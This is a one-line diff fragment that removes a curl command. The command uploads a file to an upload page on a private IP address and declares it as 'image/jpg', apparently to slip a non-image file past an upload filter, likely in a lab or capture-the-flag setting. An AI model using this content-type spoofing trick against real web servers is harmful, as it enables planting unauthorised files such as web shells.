@@ -1,1 +1,0 @@
-curl   -F uploaded=@"./f;type=image/jpg"   -F Upload=Upload "http://10.11.200.55/?page=upload#"
